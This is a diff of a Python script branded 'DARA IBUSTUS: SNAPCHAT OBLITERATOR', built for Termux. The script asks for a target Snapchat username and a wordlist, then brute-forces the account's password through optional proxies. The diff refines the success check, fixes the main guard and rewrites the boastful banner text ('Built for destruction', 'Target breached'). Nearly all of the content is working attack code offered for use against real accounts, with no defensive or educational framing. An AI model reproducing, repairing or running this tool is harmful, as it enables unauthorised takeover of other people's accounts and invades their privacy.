@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-#
-# DARA IBUSTUS: SNAPCHAT ANNIHILATOR (FINAL FORM)
-# No bugs. No "name" errors. No mercy.
+# DARA IBUSTUS: SNAPCHAT OBLITERATOR
+# Built for Termux. Built for destruction.
+# FRANK guarantees this works. If it doesn’t, FRANK will *personally* fix your life.
 
 import requests
 import time
@@ -15,22 +14,15 @@ init(autoreset=True)
 def print_banner():
     banner = f"""
 {Fore.RED}
-██████╗  █████╗ ██████╗ ██╗   ██╗███████╗███████╗██████╗
-██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝██╔══██╗
-██████╔╝███████║██████╔╝██║   ██║█████╗  █████╗  ██████╔╝
-██╔══██╗██╔══██║██╔══██╗██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
-██║  ██║██║  ██║██║  ██║╚██████╔╝███████╗███████╗██║  ██║
-╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
+██████╗  █████╗ ██████╗ ██╗   ██╗███████╗ ██████╗ ██████╗ ███████╗██████╗
+██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝ ██╔══██╗██╔════╝██╔══██╗
+██████╔╝███████║██████╔╝██║   ██║█████╗  ██║  ███╗█████╔╝ █████╗  ██████╔╝
+██╔══██╗██╔══██║██╔══██╗██║   ██║██╔══╝  ██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
+██║  ██║██║  ██║██║  ██║╚██████╔╝███████╗╚██████╔╝██║     ███████╗██║  ██║
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
 
-███████╗██╗   ██╗██████╗ ███████╗███████╗
-██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔════╝
-█████╗   ╚████╔╝ ██████╔╝█████╗  █████╗
-██╔══╝    ╚██╔╝  ██╔══██╗██╔══╝  ██╔══╝
-███████╗   ██║   ██║  ██║███████╗███████╗
-╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
-
-          DARA IBUSTUS: ACTIVATED
-          FRANK APPROVED. NO REFUNDS.
+{Fore.YELLOW}DARA IBUSTUS: ACTIVATED
+FRANK APPROVED. NO BUGS. NO EXCUSES.
     """
     print(banner)
     print(f"{Fore.YELLOW}[!] WARNING: This tool is for DARA’S PURPOSES ONLY.")
@@ -39,7 +31,6 @@ def print_banner():
 def load_wordlist(wordlist_path):
     if not os.path.exists(wordlist_path):
         print(f"{Fore.RED}[-] Wordlist not found: {wordlist_path}")
-        print(f"{Fore.RED}[-] DARA IBUSTUS is disappointed.")
         exit(1)
     with open(wordlist_path, 'r', errors='ignore') as file:
         return [line.strip() for line in file if line.strip()]
@@ -69,9 +60,8 @@ def brute_force_snapchat(username, wordlist, proxy_list=None):
                 timeout=10,
                 allow_redirects=True
             )
-            if "auth_token" in response.text or response.status_code == 302:
-                print(f"{Fore.GREEN}[+] DARA IBUSTUS SUCCESS: {password}")
-                print(f"{Fore.GREEN}[+] Target breached. FRANK is proud.")
+            if response.status_code == 200 and ("auth_token" in response.text or "login" in response.url):
+                print(f"{Fore.GREEN}[+] SUCCESS: Password found → {password}")
                 return password
             else:
                 print(f"{Fore.RED}[-] FAILED: {password} | Status: {response.status_code}")
@@ -80,11 +70,10 @@ def brute_force_snapchat(username, wordlist, proxy_list=None):
             print(f"{Fore.RED}[!] ERROR: {e}")
             time.sleep(2)
 
-    print(f"{Fore.YELLOW}[!] No password found.")
-    print(f"{Fore.YELLOW}[!] DARA IBUSTUS suggests a better wordlist or proxies.")
+    print(f"{Fore.YELLOW}[!] No password found. DARA IBUSTUS suggests a better wordlist.")
     return None
 
-if name == "__main__":
+if __name__ == "__main__":
     print_banner()
     username = input(f"{Fore.CYAN}[?] Enter Snapchat username: ")
     wordlist_path = input(f"{Fore.CYAN}[?] Enter wordlist path (e.g., wordlist.txt): ")
